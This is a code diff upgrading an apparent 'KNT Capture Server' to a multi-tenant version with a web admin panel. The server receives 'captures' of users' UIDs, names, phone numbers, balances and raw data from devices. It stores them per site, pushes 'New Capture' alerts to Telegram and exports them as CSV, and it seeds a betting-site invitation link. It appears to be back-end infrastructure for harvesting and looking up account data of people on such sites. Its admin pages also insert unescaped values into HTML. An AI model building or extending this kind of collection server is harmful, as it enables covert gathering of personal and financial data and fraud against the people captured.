@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-KNT Capture Server v3 -- PostgreSQL
+KNT Capture Server v4 -- Multi-Tenant + Web Admin Panel
 """
 
 import os
@@ -30,7 +30,6 @@ POOL = None
 async def init_pool():
     global POOL
     url = DATABASE_URL
-    # Render gives postgres://... but asyncpg needs postgresql://
     if url.startswith("postgres://"):
         url = url.replace("postgres://", "postgresql://", 1)
     POOL = await asyncpg.create_pool(url, min_size=1, max_size=8)
@@ -41,6 +40,7 @@ async def init_db():
         await c.execute("""
         CREATE TABLE IF NOT EXISTS captures (
             id           SERIAL PRIMARY KEY,
+            site_key     TEXT DEFAULT 'default',
             device_id    TEXT,
             uid          TEXT,
             user_name    TEXT,
@@ -55,23 +55,27 @@ async def init_db():
             received_at  TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
             note         TEXT,
             tag          TEXT,
-            UNIQUE(device_id, uid)
+            UNIQUE(site_key, device_id, uid)
         );
         CREATE INDEX IF NOT EXISTS idx_cap_uid ON captures(uid);
+        CREATE INDEX IF NOT EXISTS idx_cap_site ON captures(site_key);
 
         CREATE TABLE IF NOT EXISTS subordinates (
             id           SERIAL PRIMARY KEY,
+            site_key     TEXT DEFAULT 'default',
             owner_uid    TEXT,
-            uid          TEXT UNIQUE,
+            uid          TEXT,
             user_name    TEXT,
             phone        TEXT,
             balance      TEXT,
             raw          TEXT,
             note         TEXT,
             tag          TEXT,
-            captured_at  TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            captured_at  TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+            UNIQUE(site_key, uid)
         );
         CREATE INDEX IF NOT EXISTS idx_sub_uid ON subordinates(uid);
+        CREATE INDEX IF NOT EXISTS idx_sub_site ON subordinates(site_key);
 
         CREATE TABLE IF NOT EXISTS bot_users (
             telegram_id  BIGINT PRIMARY KEY,
@@ -83,6 +87,7 @@ async def init_db():
 
         CREATE TABLE IF NOT EXISTS query_history (
             id           SERIAL PRIMARY KEY,
+            site_key     TEXT DEFAULT 'default',
             telegram_id  BIGINT,
             query_uid    TEXT,
             result       TEXT,
@@ -90,6 +95,7 @@ async def init_db():
         );
         CREATE INDEX IF NOT EXISTS idx_qh_uid ON query_history(query_uid);
         CREATE INDEX IF NOT EXISTS idx_qh_tg ON query_history(telegram_id);
+        CREATE INDEX IF NOT EXISTS idx_qh_site ON query_history(site_key);
 
         CREATE TABLE IF NOT EXISTS settings (
             key   TEXT PRIMARY KEY,
@@ -115,6 +121,15 @@ async def init_db():
             target       TEXT,
             ts           TIMESTAMP DEFAULT CURRENT_TIMESTAMP
         );
+
+        CREATE TABLE IF NOT EXISTS sites (
+            key          TEXT PRIMARY KEY,
+            name         TEXT,
+            register_url TEXT,
+            admin_uid    TEXT,
+            note         TEXT,
+            created_at   TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+        );
         """)
 
         # default settings
@@ -132,6 +147,13 @@ async def init_db():
 
         await c.execute("INSERT INTO admins VALUES ($1,$2,CURRENT_TIMESTAMP) ON CONFLICT (username) DO NOTHING",
                         "admin", hashlib.sha256(ADMIN_PASSWORD.encode()).hexdigest())
+
+        # default site
+        await c.execute("""INSERT INTO sites (key, name, register_url, admin_uid)
+                           VALUES ($1,$2,$3,$4) ON CONFLICT (key) DO NOTHING""",
+                        "default", "Default Site",
+                        "https://dkwin9.com/#/register?invitationCode=164651193511",
+                        "164651193511")
 
 
 async def setting(key, default=""):
@@ -162,16 +184,16 @@ async def is_blacklisted(uid):
     return row is not None
 
 
-async def save_capture(item):
+async def save_capture(item, site_key="default"):
     try:
         async with POOL.acquire() as c:
             res = await c.execute("""
                 INSERT INTO captures
-                (device_id, uid, user_name, nick_name, phone, balance,
+                (site_key, device_id, uid, user_name, nick_name, phone, balance,
                  amount_code, host, source_url, raw, captured_at)
-                VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11)
-                ON CONFLICT (device_id, uid) DO NOTHING
-            """, item.get("device_id", ""), item.get("uid", ""),
+                VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12)
+                ON CONFLICT (site_key, device_id, uid) DO NOTHING
+            """, site_key, item.get("device_id", ""), item.get("uid", ""),
                 item.get("userName", ""), item.get("nickName", ""),
                 item.get("phone", ""), item.get("balance", ""),
                 item.get("amountOfCode", ""), item.get("host", ""),
@@ -182,20 +204,20 @@ async def save_capture(item):
         return False
 
 
-async def save_subordinate(owner_uid, sub):
+async def save_subordinate(owner_uid, sub, site_key="default"):
     try:
         async with POOL.acquire() as c:
             await c.execute("""
                 INSERT INTO subordinates
-                (owner_uid, uid, user_name, phone, balance, raw)
-                VALUES ($1,$2,$3,$4,$5,$6)
-                ON CONFLICT (uid) DO UPDATE SET
+                (site_key, owner_uid, uid, user_name, phone, balance, raw)
+                VALUES ($1,$2,$3,$4,$5,$6,$7)
+                ON CONFLICT (site_key, uid) DO UPDATE SET
                     owner_uid = EXCLUDED.owner_uid,
                     user_name = EXCLUDED.user_name,
                     phone = EXCLUDED.phone,
                     balance = EXCLUDED.balance,
                     raw = EXCLUDED.raw
-            """, owner_uid, sub.get("uid", ""), sub.get("userName", ""),
+            """, site_key, owner_uid, sub.get("uid", ""), sub.get("userName", ""),
                 sub.get("phone", ""), sub.get("balance", ""), sub.get("raw", ""))
         return True
     except Exception:
@@ -220,7 +242,7 @@ async def notify(text):
 # ---- PUBLIC ROUTES ----------------------------------------------------------
 
 async def handle_root(req):
-    return web.Response(text="KNT Capture Server v3 (Postgres)")
+    return web.Response(text="KNT Capture Server v4 (Multi-Tenant)")
 
 
 async def handle_health(req):
@@ -229,9 +251,17 @@ async def handle_health(req):
         n_sub = await c.fetchval("SELECT COUNT(*) FROM subordinates")
         n_bot = await c.fetchval("SELECT COUNT(*) FROM bot_users")
         n_bl = await c.fetchval("SELECT COUNT(*) FROM blacklist")
+        n_sites = await c.fetchval("SELECT COUNT(*) FROM sites")
     return web.json_response({"ok": True, "captures": n_cap,
                               "subordinates": n_sub, "bot_users": n_bot,
-                              "blacklist": n_bl})
+                              "blacklist": n_bl, "sites": n_sites})
+
+
+async def handle_sites_public(req):
+    async with POOL.acquire() as c:
+        rows = await c.fetch("SELECT key, name, register_url, admin_uid FROM sites ORDER BY key")
+    return web.json_response({"ok": True,
+                              "sites": [dict(r) for r in rows]})
 
 
 async def handle_ingest(req):
@@ -241,6 +271,11 @@ async def handle_ingest(req):
         data = await req.json()
     except Exception:
         return web.json_response({"ok": False, "err": "bad json"}, status=400)
+
+    site_key = "default"
+    if isinstance(data, dict):
+        site_key = data.get("site_key", "default")
+
     items = data if isinstance(data, list) else (data.get("items") or data.get("captures") or [])
     items = items[:MAX_PER_REQUEST]
     saved = 0
@@ -249,13 +284,15 @@ async def handle_ingest(req):
             continue
         if await is_blacklisted(it.get("uid", "")):
             continue
-        if await save_capture(it):
+        if await save_capture(it, site_key):
             saved += 1
             asyncio.create_task(notify(
-                f"🎯 <b>New Capture</b>\n🆔 <code>{it.get('uid','?')}</code>\n"
+                f"🎯 <b>New Capture</b> ({site_key})\n"
+                f"🆔 <code>{it.get('uid','?')}</code>\n"
                 f"👤 {it.get('userName','?')}\n💎 {it.get('balance','?')}"
             ))
-    return web.json_response({"ok": True, "received": len(items), "saved": saved})
+    return web.json_response({"ok": True, "received": len(items), "saved": saved,
+                              "site_key": site_key})
 
 
 async def handle_subs_ingest(req):
@@ -265,6 +302,8 @@ async def handle_subs_ingest(req):
         data = await req.json()
     except Exception:
         return web.json_response({"ok": False, "err": "bad json"}, status=400)
+
+    site_key = data.get("site_key", "default") if isinstance(data, dict) else "default"
     owner = data.get("owner_uid", "")
     items = (data.get("items") or [])[:MAX_PER_REQUEST]
     saved = 0
@@ -272,10 +311,11 @@ async def handle_subs_ingest(req):
         if isinstance(it, dict) and it.get("uid"):
             if await is_blacklisted(it["uid"]):
                 continue
-            if await save_subordinate(owner, it):
+            if await save_subordinate(owner, it, site_key):
                 saved += 1
-    asyncio.create_task(notify(f"📡 Subordinate Sync: {saved} saved"))
-    return web.json_response({"ok": True, "received": len(items), "saved": saved})
+    asyncio.create_task(notify(f"📡 Subordinate Sync ({site_key}): {saved} saved"))
+    return web.json_response({"ok": True, "received": len(items),
+                              "saved": saved, "site_key": site_key})
 
 
 async def handle_check_uid(req):
@@ -283,21 +323,28 @@ async def handle_check_uid(req):
     if token != INGEST_TOKEN:
         return web.json_response({"ok": False, "err": "unauthorized"}, status=401)
     uid = (req.query.get("uid") or "").strip()
+    site_key = (req.query.get("site") or "default").strip()
     if not uid:
         return web.json_response({"ok": False, "err": "no uid"}, status=400)
 
     if await is_blacklisted(uid):
-        return web.json_response({"ok": True, "found": False, "uid": uid, "blacklisted": True})
+        return web.json_response({"ok": True, "found": False, "uid": uid,
+                                  "site_key": site_key, "blacklisted": True})
 
     async with POOL.acquire() as c:
-        sub = await c.fetchrow("SELECT * FROM subordinates WHERE uid=$1", uid)
-        cap = await c.fetchrow("SELECT * FROM captures WHERE uid=$1 ORDER BY id DESC LIMIT 1", uid)
+        sub = await c.fetchrow(
+            "SELECT * FROM subordinates WHERE uid=$1 AND site_key=$2",
+            uid, site_key)
+        cap = await c.fetchrow(
+            "SELECT * FROM captures WHERE uid=$1 AND site_key=$2 ORDER BY id DESC LIMIT 1",
+            uid, site_key)
 
     if not sub:
-        return web.json_response({"ok": True, "found": False, "uid": uid})
+        return web.json_response({"ok": True, "found": False, "uid": uid,
+                                  "site_key": site_key})
 
     return web.json_response({
-        "ok": True, "found": True, "uid": uid,
+        "ok": True, "found": True, "uid": uid, "site_key": site_key,
         "userName": sub["user_name"] or (cap["user_name"] if cap else "") or "",
         "phone": sub["phone"] or (cap["phone"] if cap else "") or "",
         "balance": sub["balance"] or (cap["balance"] if cap else "") or "",
@@ -316,9 +363,10 @@ async def handle_query_log(req):
     tid = data.get("telegram_id", 0)
     uid = data.get("uid", "")
     result = data.get("result", "")
+    site_key = data.get("site_key", "default")
     async with POOL.acquire() as c:
-        await c.execute("INSERT INTO query_history (telegram_id, query_uid, result) VALUES ($1,$2,$3)",
-                        int(tid), uid, result)
+        await c.execute("INSERT INTO query_history (site_key, telegram_id, query_uid, result) "
+                        "VALUES ($1,$2,$3,$4)", site_key, int(tid), uid, result)
         await c.execute("""INSERT INTO bot_users (telegram_id, uid, last_check)
                            VALUES ($1,$2,CURRENT_TIMESTAMP)
                            ON CONFLICT (telegram_id) DO UPDATE SET
@@ -381,6 +429,7 @@ def admin_required(handler):
 def page(title, body, active=""):
     nav = [
         ("/admin", "📊 Dashboard", "dash"),
+        ("/admin/sites", "🌐 Sites", "sites"),
         ("/admin/captures", "📱 Captures", "cap"),
         ("/admin/subs", "👥 Subordinates", "sub"),
         ("/admin/users", "🤖 Bot Users", "user"),
@@ -429,6 +478,7 @@ textarea{{min-height:90px;resize:vertical}}
 .empty{{color:#7ae0c4;font-size:.85rem;padding:1rem;text-align:center}}
 .mono{{font-family:monospace;font-size:.75rem}}
 .tag{{display:inline-block;padding:.1rem .4rem;background:#1a4a3d;color:#a8ffd8;border-radius:.3rem;font-size:.7rem;margin:.1rem}}
+.tag.site{{background:#1a2f4a;color:#a8d4ff}}
 .bar-chart{{display:flex;align-items:flex-end;gap:4px;height:80px;margin-top:.5rem}}
 .bar-chart>div{{flex:1;background:linear-gradient(180deg,#1effbc,#008064);border-radius:2px 2px 0 0;min-height:2px;position:relative}}
 .bar-chart>div>span{{position:absolute;bottom:-18px;left:0;right:0;text-align:center;font-size:.6rem;color:#7ae0c4}}
@@ -495,43 +545,49 @@ async def admin_logout(req):
 
 @admin_required
 async def admin_dashboard(req):
+    site_filter = req.query.get("site", "").strip()
     async with POOL.acquire() as c:
-        n_cap = await c.fetchval("SELECT COUNT(*) FROM captures")
-        n_sub = await c.fetchval("SELECT COUNT(*) FROM subordinates")
+        if site_filter:
+            n_cap = await c.fetchval("SELECT COUNT(*) FROM captures WHERE site_key=$1", site_filter)
+            n_sub = await c.fetchval("SELECT COUNT(*) FROM subordinates WHERE site_key=$1", site_filter)
+            n_q = await c.fetchval("SELECT COUNT(*) FROM query_history WHERE site_key=$1", site_filter)
+            n_found = await c.fetchval("SELECT COUNT(*) FROM query_history WHERE result='found' AND site_key=$1", site_filter)
+            n_not = await c.fetchval("SELECT COUNT(*) FROM query_history WHERE result='not_found' AND site_key=$1", site_filter)
+        else:
+            n_cap = await c.fetchval("SELECT COUNT(*) FROM captures")
+            n_sub = await c.fetchval("SELECT COUNT(*) FROM subordinates")
+            n_q = await c.fetchval("SELECT COUNT(*) FROM query_history")
+            n_found = await c.fetchval("SELECT COUNT(*) FROM query_history WHERE result='found'")
+            n_not = await c.fetchval("SELECT COUNT(*) FROM query_history WHERE result='not_found'")
         n_bot = await c.fetchval("SELECT COUNT(*) FROM bot_users")
-        n_q = await c.fetchval("SELECT COUNT(*) FROM query_history")
-        n_found = await c.fetchval("SELECT COUNT(*) FROM query_history WHERE result='found'")
-        n_not = await c.fetchval("SELECT COUNT(*) FROM query_history WHERE result='not_found'")
         n_bl = await c.fetchval("SELECT COUNT(*) FROM blacklist")
+        n_sites = await c.fetchval("SELECT COUNT(*) FROM sites")
         recent = await c.fetch("SELECT * FROM query_history ORDER BY id DESC LIMIT 15")
-        chart = await c.fetch("""
-            SELECT date(queried_at) d, COUNT(*) cnt FROM query_history
-            WHERE queried_at >= CURRENT_DATE - INTERVAL '7 days'
-            GROUP BY d ORDER BY d
-        """)
-
-    days = {str(r["d"]): r["cnt"] for r in chart}
-    maxv = max(days.values()) if days else 1
-    bars = ""
-    for i in range(6, -1, -1):
-        t = time.time() - i * 86400
-        day = time.strftime("%Y-%m-%d", time.localtime(t))
-        v = days.get(day, 0)
-        h = int((v / max(maxv, 1)) * 60)
-        bars += f'<div style="height:{max(h,2)}px"><span>{day[5:]}</span></div>'
+        sites = await c.fetch("SELECT key, name FROM sites ORDER BY key")
 
     rows = ""
     for r in recent:
         rows += f"""<tr>
+            <td><span class="tag site">{r['site_key']}</span></td>
             <td><code>{r['telegram_id']}</code></td>
             <td><code>{r['query_uid']}</code></td>
             <td>{'✅' if r['result']=='found' else '❌'}</td>
             <td class="mono">{r['queried_at']}</td></tr>"""
     if not rows:
-        rows = '<tr><td colspan="4" class="empty">No queries yet</td></tr>'
+        rows = '<tr><td colspan="5" class="empty">No queries yet</td></tr>'
+
+    site_options = '<option value="">All Sites</option>'
+    for s in sites:
+        sel = ' selected' if site_filter == s["key"] else ''
+        site_options += f'<option value="{s["key"]}"{sel}>{s["name"]} ({s["key"]})</option>'
 
     body = f"""
     <h1>📊 Dashboard</h1>
+    <div class="card">
+        <form method="GET" style="display:flex;gap:.5rem">
+            <select name="site" onchange="this.form.submit()">{site_options}</select>
+        </form>
+    </div>
     <div class="stats">
         <div class="stat"><span class="n">{n_cap}</span><div class="l">Captures</div></div>
         <div class="stat"><span class="n">{n_sub}</span><div class="l">Subordinates</div></div>
@@ -540,13 +596,80 @@ async def admin_dashboard(req):
         <div class="stat"><span class="n">{n_found}</span><div class="l">Found</div></div>
         <div class="stat"><span class="n">{n_not}</span><div class="l">Not Found</div></div>
         <div class="stat"><span class="n">{n_bl}</span><div class="l">Blacklisted</div></div>
+        <div class="stat"><span class="n">{n_sites}</span><div class="l">Sites</div></div>
     </div>
-    <h2>Queries Last 7 Days</h2>
-    <div class="card"><div class="bar-chart">{bars}</div><div style="height:20px"></div></div>
     <h2>Recent Queries</h2>
-    <table><tr><th>Telegram ID</th><th>UID</th><th>Result</th><th>Time</th></tr>{rows}</table>
+    <table><tr><th>Site</th><th>Telegram ID</th><th>UID</th><th>Result</th><th>Time</th></tr>{rows}</table>
     """
     return web.Response(text=page("Dashboard", body, "dash"), content_type="text/html")
+
+
+# ---- SITES ------------------------------------------------------------------
+
+@admin_required
+async def admin_sites(req):
+    async with POOL.acquire() as c:
+        rows = await c.fetch("SELECT * FROM sites ORDER BY key")
+    body = """<h1>🌐 Sites</h1>
+    <div class="card">
+        <h2>Add / Update Site</h2>
+        <form method="POST" action="/admin/sites/add">
+            <div class="row">
+                <input name="key" placeholder="site key (e.g. sojol_hgnice)" required>
+                <input name="name" placeholder="display name" required>
+            </div>
+            <div class="row">
+                <input name="register_url" placeholder="register URL with invite code">
+                <input name="admin_uid" placeholder="admin UID">
+            </div>
+            <div class="row">
+                <input name="note" placeholder="note (optional)">
+            </div>
+            <button class="btn blue" type="submit">Save Site</button>
+        </form>
+    </div>
+    <table><tr><th>Key</th><th>Name</th><th>Register URL</th><th>Admin UID</th><th>Created</th><th>Action</th></tr>"""
+    for r in rows:
+        body += f"""<tr>
+            <td><span class="tag site">{r['key']}</span></td>
+            <td>{r['name'] or '—'}</td>
+            <td class="mono">{r['register_url'] or '—'}</td>
+            <td><code>{r['admin_uid'] or '—'}</code></td>
+            <td class="mono">{r['created_at']}</td>
+            <td>{"—" if r['key']=='default' else f'<a class="btn red" href="/admin/sites/delete/{r["key"]}" onclick="return confirm(\'delete?\')">🗑</a>'}</td>
+        </tr>"""
+    body += "</table>"
+    return web.Response(text=page("Sites", body, "sites"), content_type="text/html")
+
+
+@admin_required
+async def admin_sites_add(req):
+    data = await req.post()
+    key = (data.get("key") or "").strip().lower().replace(" ", "_")
+    if not key:
+        return web.HTTPFound("/admin/sites")
+    async with POOL.acquire() as c:
+        await c.execute("""
+            INSERT INTO sites (key, name, register_url, admin_uid, note)
+            VALUES ($1,$2,$3,$4,$5)
+            ON CONFLICT (key) DO UPDATE SET
+                name=EXCLUDED.name,
+                register_url=EXCLUDED.register_url,
+                admin_uid=EXCLUDED.admin_uid,
+                note=EXCLUDED.note
+        """, key, data.get("name",""), data.get("register_url",""),
+            data.get("admin_uid",""), data.get("note",""))
+    return web.HTTPFound("/admin/sites")
+
+
+@admin_required
+async def admin_sites_delete(req):
+    key = req.match_info["key"]
+    if key == "default":
+        return web.HTTPFound("/admin/sites")
+    async with POOL.acquire() as c:
+        await c.execute("DELETE FROM sites WHERE key=$1", key)
+    return web.HTTPFound("/admin/sites")
 
 
 # ---- CAPTURES ---------------------------------------------------------------
@@ -554,52 +677,50 @@ async def admin_dashboard(req):
 @admin_required
 async def admin_captures(req):
     q = req.query.get("q", "").strip()
+    site_filter = req.query.get("site", "").strip()
     async with POOL.acquire() as c:
+        sites = await c.fetch("SELECT key, name FROM sites ORDER BY key")
+        sql = "SELECT * FROM captures WHERE 1=1"
+        params = []
+        if site_filter:
+            params.append(site_filter)
+            sql += f" AND site_key = ${len(params)}"
         if q:
-            rows = await c.fetch("""SELECT * FROM captures
-                WHERE uid LIKE $1 OR user_name LIKE $1 OR device_id LIKE $1
-                ORDER BY id DESC LIMIT 300""", f"%{q}%")
-        else:
-            rows = await c.fetch("SELECT * FROM captures ORDER BY id DESC LIMIT 300")
+            params.append(f"%{q}%")
+            sql += f" AND (uid LIKE ${len(params)} OR user_name LIKE ${len(params)} OR device_id LIKE ${len(params)})"
+        sql += " ORDER BY id DESC LIMIT 300"
+        rows = await c.fetch(sql, *params)
+
+    site_options = '<option value="">All Sites</option>'
+    for s in sites:
+        sel = ' selected' if site_filter == s["key"] else ''
+        site_options += f'<option value="{s["key"]}"{sel}>{s["name"]} ({s["key"]})</option>'
 
     body = f"""<h1>📱 Captures</h1>
     <div class="card">
-        <form method="GET" style="display:flex;gap:.5rem">
-            <input name="q" placeholder="search" value="{q}">
+        <form method="GET" style="display:flex;gap:.5rem;flex-wrap:wrap">
+            <select name="site" style="flex:1;min-width:160px">{site_options}</select>
+            <input name="q" placeholder="search UID/name/device" value="{q}" style="flex:2;min-width:180px">
             <button class="btn blue" type="submit">Search</button>
-            <a class="btn yel" href="/admin/captures/export">📥 CSV</a>
+            <a class="btn yel" href="/admin/captures/export?site={site_filter}">📥 CSV</a>
         </form>
     </div>
-    <div class="card">
-        <h2>Add</h2>
-        <form method="POST" action="/admin/captures/add">
-            <div class="row">
-                <input name="uid" placeholder="UID" required>
-                <input name="user_name" placeholder="Name">
-                <input name="balance" placeholder="Balance">
-                <input name="tag" placeholder="tag">
-                <button class="btn blue" type="submit">Add</button>
-            </div>
-        </form>
-    </div>
-    <table><tr><th>ID</th><th>UID</th><th>Name</th><th>Balance</th><th>Tag</th><th>Time</th><th>Action</th></tr>"""
+    <table><tr><th>Site</th><th>ID</th><th>UID</th><th>Name</th><th>Balance</th><th>Time</th><th>Action</th></tr>"""
     for r in rows:
-        tag = f'<span class="tag">{r["tag"]}</span>' if r["tag"] else '—'
         body += f"""<tr>
+            <td><span class="tag site">{r['site_key'] or 'default'}</span></td>
             <td>{r['id']}</td>
             <td><code>{r['uid']}</code></td>
             <td>{r['user_name'] or r['nick_name'] or '—'}</td>
             <td>{r['balance'] or '—'}</td>
-            <td>{tag}</td>
             <td class="mono">{r['received_at']}</td>
             <td>
                 <a class="btn yel" href="/admin/captures/edit/{r['id']}">✏</a>
-                <a class="btn red" href="/admin/captures/delete/{r['id']}"
-                    onclick="return confirm('delete?')">🗑</a>
+                <a class="btn red" href="/admin/captures/delete/{r['id']}" onclick="return confirm('delete?')">🗑</a>
             </td></tr>"""
     if not rows:
         body += '<tr><td colspan="7" class="empty">No captures</td></tr>'
-    body += '</table>'
+    body += "</table>"
     return web.Response(text=page("Captures", body, "cap"), content_type="text/html")
 
 
@@ -644,26 +765,18 @@ async def admin_captures_delete(req):
     cid = int(req.match_info["id"])
     async with POOL.acquire() as c:
         await c.execute("DELETE FROM captures WHERE id=$1", cid)
-    await log_activity(req["admin_user"], "delete_capture", str(cid))
-    return web.HTTPFound("/admin/captures")
-
-
-@admin_required
-async def admin_captures_add(req):
-    data = await req.post()
-    await save_capture({
-        "device_id": "manual", "uid": data.get("uid", ""),
-        "userName": data.get("user_name", ""),
-        "balance": data.get("balance", ""),
-        "updatedAt": int(time.time() * 1000)})
     return web.HTTPFound("/admin/captures")
 
 
 @admin_required
 async def admin_captures_export(req):
+    site_filter = req.query.get("site", "").strip()
     async with POOL.acquire() as c:
-        rows = await c.fetch("SELECT uid, user_name, balance, tag, note, received_at FROM captures ORDER BY id DESC")
-    csv = "uid,user_name,balance,tag,note,received_at\n"
+        if site_filter:
+            rows = await c.fetch("SELECT site_key, uid, user_name, balance, tag, note, received_at FROM captures WHERE site_key=$1 ORDER BY id DESC", site_filter)
+        else:
+            rows = await c.fetch("SELECT site_key, uid, user_name, balance, tag, note, received_at FROM captures ORDER BY id DESC")
+    csv = "site_key,uid,user_name,balance,tag,note,received_at\n"
     for r in rows:
         csv += ",".join(f'"{str(r[k] or "")}"' for k in r.keys()) + "\n"
     return web.Response(text=csv, content_type="text/csv",
@@ -675,45 +788,46 @@ async def admin_captures_export(req):
 @admin_required
 async def admin_subs(req):
     q = req.query.get("q", "").strip()
+    site_filter = req.query.get("site", "").strip()
     async with POOL.acquire() as c:
+        sites = await c.fetch("SELECT key, name FROM sites ORDER BY key")
+        sql = "SELECT * FROM subordinates WHERE 1=1"
+        params = []
+        if site_filter:
+            params.append(site_filter)
+            sql += f" AND site_key = ${len(params)}"
         if q:
-            rows = await c.fetch("""SELECT * FROM subordinates
-                WHERE uid LIKE $1 OR user_name LIKE $1 OR phone LIKE $1
-                ORDER BY id DESC LIMIT 500""", f"%{q}%")
-        else:
-            rows = await c.fetch("SELECT * FROM subordinates ORDER BY id DESC LIMIT 500")
+            params.append(f"%{q}%")
+            sql += f" AND (uid LIKE ${len(params)} OR user_name LIKE ${len(params)} OR phone LIKE ${len(params)})"
+        sql += " ORDER BY id DESC LIMIT 500"
+        rows = await c.fetch(sql, *params)
+
+    site_options = '<option value="">All Sites</option>'
+    for s in sites:
+        sel = ' selected' if site_filter == s["key"] else ''
+        site_options += f'<option value="{s["key"]}"{sel}>{s["name"]} ({s["key"]})</option>'
 
     body = f"""<h1>👥 Subordinates</h1>
     <div class="card">
-        <form method="GET" style="display:flex;gap:.5rem">
-            <input name="q" placeholder="search" value="{q}">
+        <form method="GET" style="display:flex;gap:.5rem;flex-wrap:wrap">
+            <select name="site" style="flex:1;min-width:160px">{site_options}</select>
+            <input name="q" placeholder="search UID/name/phone" value="{q}" style="flex:2;min-width:180px">
             <button class="btn blue" type="submit">Search</button>
-            <a class="btn yel" href="/admin/subs/export">📥 CSV</a>
+            <a class="btn yel" href="/admin/subs/export?site={site_filter}">📥 CSV</a>
         </form>
     </div>
-    <div class="card">
-        <h2>Add</h2>
-        <form method="POST" action="/admin/subs/add">
-            <div class="row">
-                <input name="uid" placeholder="UID" required>
-                <input name="user_name" placeholder="Name">
-                <input name="owner_uid" placeholder="Owner UID">
-                <button class="btn blue" type="submit">Add</button>
-            </div>
-        </form>
-    </div>
-    <table><tr><th>UID</th><th>Name</th><th>Phone</th><th>Owner</th><th>Action</th></tr>"""
+    <table><tr><th>Site</th><th>UID</th><th>Name</th><th>Owner</th><th>Action</th></tr>"""
     for r in rows:
         body += f"""<tr>
+            <td><span class="tag site">{r['site_key'] or 'default'}</span></td>
             <td><code>{r['uid']}</code></td>
             <td>{r['user_name'] or '—'}</td>
-            <td>{r['phone'] or '—'}</td>
             <td><code>{r['owner_uid'] or '—'}</code></td>
-            <td><a class="btn red" href="/admin/subs/delete/{r['id']}"
-                onclick="return confirm('delete?')">🗑</a></td></tr>"""
+            <td><a class="btn red" href="/admin/subs/delete/{r['id']}" onclick="return confirm('delete?')">🗑</a></td>
+        </tr>"""
     if not rows:
         body += '<tr><td colspan="5" class="empty">No subordinates</td></tr>'
-    body += '</table>'
+    body += "</table>"
     return web.Response(text=page("Subordinates", body, "sub"), content_type="text/html")
 
 
@@ -726,19 +840,14 @@ async def admin_subs_delete(req):
 
 
 @admin_required
-async def admin_subs_add(req):
-    data = await req.post()
-    await save_subordinate(data.get("owner_uid", ""), {
-        "uid": data.get("uid", ""), "userName": data.get("user_name", ""),
-        "phone": "", "balance": "", "raw": ""})
-    return web.HTTPFound("/admin/subs")
-
-
-@admin_required
 async def admin_subs_export(req):
+    site_filter = req.query.get("site", "").strip()
     async with POOL.acquire() as c:
-        rows = await c.fetch("SELECT uid, user_name, phone, owner_uid, captured_at FROM subordinates ORDER BY id DESC")
-    csv = "uid,user_name,phone,owner_uid,captured_at\n"
+        if site_filter:
+            rows = await c.fetch("SELECT site_key, uid, user_name, phone, owner_uid, captured_at FROM subordinates WHERE site_key=$1 ORDER BY id DESC", site_filter)
+        else:
+            rows = await c.fetch("SELECT site_key, uid, user_name, phone, owner_uid, captured_at FROM subordinates ORDER BY id DESC")
+    csv = "site_key,uid,user_name,phone,owner_uid,captured_at\n"
     for r in rows:
         csv += ",".join(f'"{str(r[k] or "")}"' for k in r.keys()) + "\n"
     return web.Response(text=csv, content_type="text/csv",
@@ -759,11 +868,11 @@ async def admin_users(req):
             <td><code>{r['uid'] or '—'}</code></td>
             <td class="mono">{r['first_seen']}</td>
             <td class="mono">{r['last_check'] or '—'}</td>
-            <td><a class="btn red" href="/admin/users/delete/{r['telegram_id']}"
-                onclick="return confirm('delete?')">🗑</a></td></tr>"""
+            <td><a class="btn red" href="/admin/users/delete/{r['telegram_id']}" onclick="return confirm('delete?')">🗑</a></td>
+        </tr>"""
     if not rows:
         body += '<tr><td colspan="5" class="empty">No users</td></tr>'
-    body += '</table>'
+    body += "</table>"
     return web.Response(text=page("Bot Users", body, "user"), content_type="text/html")
 
 
@@ -780,38 +889,58 @@ async def admin_users_delete(req):
 @admin_required
 async def admin_queries(req):
     uid = req.query.get("uid", "").strip()
+    site_filter = req.query.get("site", "").strip()
     async with POOL.acquire() as c:
+        sites = await c.fetch("SELECT key, name FROM sites ORDER BY key")
+        sql = "SELECT * FROM query_history WHERE 1=1"
+        params = []
+        if site_filter:
+            params.append(site_filter)
+            sql += f" AND site_key = ${len(params)}"
         if uid:
-            rows = await c.fetch("SELECT * FROM query_history WHERE query_uid LIKE $1 ORDER BY id DESC LIMIT 500",
-                                 f"%{uid}%")
-        else:
-            rows = await c.fetch("SELECT * FROM query_history ORDER BY id DESC LIMIT 500")
+            params.append(f"%{uid}%")
+            sql += f" AND query_uid LIKE ${len(params)}"
+        sql += " ORDER BY id DESC LIMIT 500"
+        rows = await c.fetch(sql, *params)
+
+    site_options = '<option value="">All Sites</option>'
+    for s in sites:
+        sel = ' selected' if site_filter == s["key"] else ''
+        site_options += f'<option value="{s["key"]}"{sel}>{s["name"]} ({s["key"]})</option>'
+
     body = f"""<h1>📜 Query History</h1>
     <div class="card">
-        <form method="GET" style="display:flex;gap:.5rem">
-            <input name="uid" placeholder="filter UID" value="{uid}">
+        <form method="GET" style="display:flex;gap:.5rem;flex-wrap:wrap">
+            <select name="site" style="flex:1;min-width:160px">{site_options}</select>
+            <input name="uid" placeholder="filter UID" value="{uid}" style="flex:1">
             <button class="btn blue" type="submit">Search</button>
             <a class="btn" href="/admin/queries">Clear</a>
-            <a class="btn yel" href="/admin/queries/export">📥 CSV</a>
+            <a class="btn yel" href="/admin/queries/export?site={site_filter}">📥 CSV</a>
         </form>
     </div>
-    <table><tr><th>Telegram ID</th><th>UID</th><th>Result</th><th>Time</th></tr>"""
+    <table><tr><th>Site</th><th>Telegram ID</th><th>UID</th><th>Result</th><th>Time</th></tr>"""
     for r in rows:
-        body += f"""<tr><td><code>{r['telegram_id']}</code></td>
+        body += f"""<tr>
+            <td><span class="tag site">{r['site_key'] or 'default'}</span></td>
+            <td><code>{r['telegram_id']}</code></td>
             <td><code>{r['query_uid']}</code></td>
             <td>{'✅' if r['result']=='found' else '❌'}</td>
             <td class="mono">{r['queried_at']}</td></tr>"""
     if not rows:
-        body += '<tr><td colspan="4" class="empty">No queries</td></tr>'
-    body += '</table>'
+        body += '<tr><td colspan="5" class="empty">No queries</td></tr>'
+    body += "</table>"
